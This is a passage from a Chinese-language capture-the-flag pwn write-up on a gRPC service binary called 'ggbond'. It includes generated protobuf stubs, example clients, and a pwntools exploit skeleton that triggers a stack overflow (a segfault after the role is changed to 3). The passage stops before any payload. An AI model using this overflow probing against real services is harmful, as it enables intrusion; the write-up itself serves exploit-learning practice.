language-python" data-language="python"><code class="language-python"><span class="token comment"># Generated by the gRPC Python protocol compiler plugin. DO NOT EDIT!</span><span class="token triple-quoted-string string">"""Client and server classes corresponding to protobuf-defined services."""</span><span class="token keyword">import</span> grpc<span class="token keyword">import</span> ggbond_pb2 <span class="token keyword">as</span> ggbond__pb2<span class="token comment">#这个类是客户端存根，用于向gRPC服务发起调用</span><span class="token keyword">class</span> <span class="token class-name">GGBondServerStub</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Missing associated documentation comment in .proto file."""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> channel<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Constructor.        Args:            channel: A grpc.Channel.        """</span>        self<span class="token punctuation">.</span>Handler <span class="token operator">=</span> channel<span class="token punctuation">.</span>unary_unary<span class="token punctuation">(</span>                <span class="token string">'/GGBond.GGBondServer/Handler'</span><span class="token punctuation">,</span>                request_serializer<span class="token operator">=</span>ggbond__pb2<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">,</span>                response_deserializer<span class="token operator">=</span>ggbond__pb2<span class="token punctuation">.</span>Response<span class="token punctuation">.</span>FromString<span class="token punctuation">,</span>                <span class="token punctuation">)</span><span class="token comment">#服务端的基类，用于实现.proto文件中定义的服务方法</span><span class="token keyword">class</span> <span class="token class-name">GGBondServerServicer</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Missing associated documentation comment in .proto file."""</span>    <span class="token comment">#服务端需要实现的业务逻辑</span>    <span class="token keyword">def</span> <span class="token function">Handler</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Missing associated documentation comment in .proto file."""</span>        context<span class="token punctuation">.</span>set_code<span class="token punctuation">(</span>grpc<span class="token punctuation">.</span>StatusCode<span class="token punctuation">.</span>UNIMPLEMENTED<span class="token punctuation">)</span>        context<span class="token punctuation">.</span>set_details<span class="token punctuation">(</span><span class="token string">'Method not implemented!'</span><span class="token punctuation">)</span>        <span class="token keyword">raise</span> NotImplementedError<span class="token punctuation">(</span><span class="token string">'Method not implemented!'</span><span class="token punctuation">)</span><span class="token comment">#实现了GGBondServerServicer接口的服务添加到gRPC服务器</span><span class="token keyword">def</span> <span class="token function">add_GGBondServerServicer_to_server</span><span class="token punctuation">(</span>servicer<span class="token punctuation">,</span> server<span class="token punctuation">)</span><span class="token punctuation">:</span>    rpc_method_handlers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'Handler'</span><span class="token punctuation">:</span> grpc<span class="token punctuation">.</span>unary_unary_rpc_method_handler<span class="token punctuation">(</span>                    servicer<span class="token punctuation">.</span>Handler<span class="token punctuation">,</span>                    request_deserializer<span class="token operator">=</span>ggbond__pb2<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>FromString<span class="token punctuation">,</span>                    response_serializer<span class="token operator">=</span>ggbond__pb2<span class="token punctuation">.</span>Response<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    generic_handler <span class="token operator">=</span> grpc<span class="token punctuation">.</span>method_handlers_generic_handler<span class="token punctuation">(</span>            <span class="token string">'GGBond.GGBondServer'</span><span class="token punctuation">,</span> rpc_method_handlers<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>add_generic_rpc_handlers<span class="token punctuation">(</span><span class="token punctuation">(</span>generic_handler<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#提供了一个静态方法，用于从客户端直接通过gRPC调用Handler服务方法</span> <span class="token comment"># This class is part of an EXPERIMENTAL API.</span><span class="token keyword">class</span> <span class="token class-name">GGBondServer</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Missing associated documentation comment in .proto file."""</span>    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">Handler</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>            target<span class="token punctuation">,</span>            options<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            channel_credentials<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            call_credentials<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            insecure<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>            compression<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            wait_for_ready<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>            metadata<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> grpc<span class="token punctuation">.</span>experimental<span class="token punctuation">.</span>unary_unary<span class="token punctuation">(</span>request<span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token string">'/GGBond.GGBondServer/Handler'</span><span class="token punctuation">,</span>            ggbond__pb2<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">,</span>            ggbond__pb2<span class="token punctuation">.</span>Response<span class="token punctuation">.</span>FromString<span class="token punctuation">,</span>            options<span class="token punctuation">,</span> channel_credentials<span class="token punctuation">,</span>            insecure<span class="token punctuation">,</span> call_credentials<span class="token punctuation">,</span> compression<span class="token punctuation">,</span> wait_for_ready<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> metadata<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ggbond_pb2.py</code>：包含了<code>.proto</code>文件中定义的所有消息（<code>Protobuf</code>消息）的<code>Python</code>类，提供了消息的序列化和反序列化功能，以及对消息字段的访问方法，用于在<code>python</code>程序中使用<code>.proto</code>文件中定义的数据结构来存储数据、通信</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span><span class="token comment"># source: ggbond.proto</span><span class="token comment"># Protobuf Python Version: 4.25.1</span><span class="token triple-quoted-string string">"""Generated protocol buffer code."""</span><span class="token comment">#导入了几个用于处理protobuf消息的Python模块,这些模块包含了用于创建和管理protobuf描述符、符号数据库等的功能</span><span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> descriptor <span class="token keyword">as</span> _descriptor<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> descriptor_pool <span class="token keyword">as</span> _descriptor_pool<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> symbol_database <span class="token keyword">as</span> _symbol_database<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf<span class="token punctuation">.</span>internal <span class="token keyword">import</span> builder <span class="token keyword">as</span> _builder<span class="token comment"># @@protoc_insertion_point(imports)</span><span class="token comment">#创建一个符号数据库实例，用于注册和查找生成的protobuf消息和枚举类型</span>_sym_db <span class="token operator">=</span> _symbol_database<span class="token punctuation">.</span>Default<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#通过将protobuf定义序列化为二进制形式添加到描述符池中来注册GGbond.proto文件中定义的所有消息和枚举类型,以便在运行时能够通过名称查找和使用这些类型</span>DESCRIPTOR <span class="token operator">=</span> _descriptor_pool<span class="token punctuation">.</span>Default<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>AddSerializedFile<span class="token punctuation">(</span><span class="token string">b'\n\x0cggbond.proto\x12\x06GGBond\"\x9c\x01\n\x07Request\x12\'\n\x06whoami\x18\x64 \x01(\x0b\x32\x15.GGBond.WhoamiRequestH\x00\x12\x30\n\x0brole_change\x18\x65 \x01(\x0b\x32\x19.GGBond.RoleChangeRequestH\x00\x12+\n\x08repeater\x18\x66 \x01(\x0b\x32\x17.GGBond.RepeaterRequestH\x00\x42\t\n\x07request\"\xcd\x01\n\x08Response\x12)\n\x06whoami\x18\xc8\x01 \x01(\x0b\x32\x16.GGBond.WhoamiResponseH\x00\x12\x32\n\x0brole_change\x18\xc9\x01 \x01(\x0b\x32\x1a.GGBond.RoleChangeResponseH\x00\x12-\n\x08repeater\x18\xca\x01 \x01(\x0b\x32\x18.GGBond.RepeaterResponseH\x00\x12\'\n\x05\x65rror\x18\xbc\x03 \x01(\x0b\x32\x15.GGBond.ErrorResponseH\x00\x42\n\n\x08response\"\x0f\n\rWhoamiRequest\"\"\n\x0eWhoamiResponse\x12\x10\n\x07message\x18\xd0\x0f \x01(\t\"\"\n\x11RoleChangeRequest\x12\r\n\x04role\x18\xe9\x07 \x01(\r\"&amp;\n\x12RoleChangeResponse\x12\x10\n\x07message\x18\xd1\x0f \x01(\t\"#\n\x0fRepeaterRequest\x12\x10\n\x07message\x18\xea\x07 \x01(\t\"$\n\x10RepeaterResponse\x12\x10\n\x07message\x18\xd2\x0f \x01(\t\"!\n\rErrorResponse\x12\x10\n\x07message\x18\xdc\" \x01(\t2&lt;\n\x0cGGBondServer\x12,\n\x07Handler\x12\x0f.GGBond.Request\x1a\x10.GGBond.ResponseB\x0bZ\t./;ggbondb\x06proto3'</span><span class="token punctuation">)</span><span class="token comment">#使用DESCRIPTOR来生成Python中的消息类和枚举,这些函数负责创建对应于.proto文件中定义的消息类型的Python类</span>_globals <span class="token operator">=</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span>_builder<span class="token punctuation">.</span>BuildMessageAndEnumDescriptors<span class="token punctuation">(</span>DESCRIPTOR<span class="token punctuation">,</span> _globals<span class="token punctuation">)</span>_builder<span class="token punctuation">.</span>BuildTopDescriptorsAndMessages<span class="token punctuation">(</span>DESCRIPTOR<span class="token punctuation">,</span> <span class="token string">'ggbond_pb2'</span><span class="token punctuation">,</span> _globals<span class="token punctuation">)</span><span class="token keyword">if</span> _descriptor<span class="token punctuation">.</span>_USE_C_DESCRIPTORS <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>  _globals<span class="token punctuation">[</span><span class="token string">'DESCRIPTOR'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_options <span class="token operator">=</span> <span class="token boolean">None</span>  _globals<span class="token punctuation">[</span><span class="token string">'DESCRIPTOR'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_options <span class="token operator">=</span> <span class="token string">b'Z\t./;ggbond'</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">25</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">181</span>  _globals<span class="token punctuation">[</span><span class="token string">'_RESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">184</span>  _globals<span class="token punctuation">[</span><span class="token string">'_RESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">389</span>  _globals<span class="token punctuation">[</span><span class="token string">'_WHOAMIREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">391</span>  _globals<span class="token punctuation">[</span><span class="token string">'_WHOAMIREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">406</span>  _globals<span class="token punctuation">[</span><span class="token string">'_WHOAMIRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">408</span>  _globals<span class="token punctuation">[</span><span class="token string">'_WHOAMIRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">442</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ROLECHANGEREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">444</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ROLECHANGEREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">478</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ROLECHANGERESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">480</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ROLECHANGERESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">518</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REPEATERREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">520</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REPEATERREQUEST'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">555</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REPEATERRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">557</span>  _globals<span class="token punctuation">[</span><span class="token string">'_REPEATERRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">593</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ERRORRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">595</span>  _globals<span class="token punctuation">[</span><span class="token string">'_ERRORRESPONSE'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">628</span>  _globals<span class="token punctuation">[</span><span class="token string">'_GGBONDSERVER'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_start<span class="token operator">=</span><span class="token number">630</span>  _globals<span class="token punctuation">[</span><span class="token string">'_GGBONDSERVER'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_serialized_end<span class="token operator">=</span><span class="token number">690</span><span class="token comment"># @@protoc_insertion_point(module_scope)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这么多看着还是云里雾里的，干脆让<code>gpt</code>写个例子</p><p><strong>RepeaterRequest</strong>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> grpc<span class="token keyword">import</span> ggbond_pb2<span class="token keyword">import</span> ggbond_pb2_grpc<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>repeater<span class="token operator">=</span>ggbond_pb2<span class="token punctuation">.</span>RepeaterRequest<span class="token punctuation">(</span>message<span class="token operator">=</span><span class="token string">'world'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 检查响应类型并相应地访问字段</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (WhoamiResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>whoami<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'role_change'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RoleChangeResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>role_change<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'repeater'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RepeaterResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>repeater<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (ErrorResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received an unknown type of response"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$python3</span> run.pyClient received <span class="token punctuation">(</span>RepeaterResponse<span class="token punctuation">)</span>: GGBOND: world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>WhoamiRequest</strong>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 发送 WhoamiRequest</span>whoami_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>WhoamiRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>whoami<span class="token operator">=</span>whoami_request<span class="token punctuation">)</span>response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$python3</span> run.py   Client received <span class="token punctuation">(</span>WhoamiResponse<span class="token punctuation">)</span>: I'm GGBOND<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>RoleChangeRequest</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">role_change_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>RoleChangeRequest<span class="token punctuation">(</span>role<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>role_change<span class="token operator">=</span>role_change_request<span class="token punctuation">)</span>response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-none"><code class="language-none">python3 run.pyClient received (RoleChangeResponse): New Role: SDaddy.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>测试（看了<code>wp</code>后）发现<code>changerole</code>为<code>3</code>时<code>RepeaterResponse</code>存在栈溢出（面向<code>wp</code>复现了属于是</p><p>拼拼凑凑写个<code>exp</code>用于交互的函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> grpc<span class="token keyword">import</span> ggbond_pb2<span class="token keyword">import</span> ggbond_pb2_grpccontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_response</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (WhoamiResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>whoami<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'role_change'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RoleChangeResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>role_change<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'repeater'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RepeaterResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>repeater<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (ErrorResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received an unknown type of response"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RepeaterRequest</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>repeater<span class="token operator">=</span>ggbond_pb2<span class="token punctuation">.</span>RepeaterRequest<span class="token punctuation">(</span>message<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">WhoamiRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        whoami_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>WhoamiRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>whoami<span class="token operator">=</span>whoami_request<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RoleChangeRequest</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        role_change_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>RoleChangeRequest<span class="token punctuation">(</span>role<span class="token operator">=</span>num<span class="token punctuation">)</span>        request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>role_change<span class="token operator">=</span>role_change_request<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试试，<code>role</code>改成<code>3</code>发送<code>0x100</code>个<code>a</code>，会报段错误</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> cContinuing.Thread <span class="token number">4</span> <span class="token string">"pwn"</span> received signal SIGSEGV, Segmentation fault.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>而发送<code>0x10</code>个<code>a</code>时:</p><pre class="line-numbers language-none"><code class="language-none">Client received (RepeaterResponse): SDaddy: YBYB, 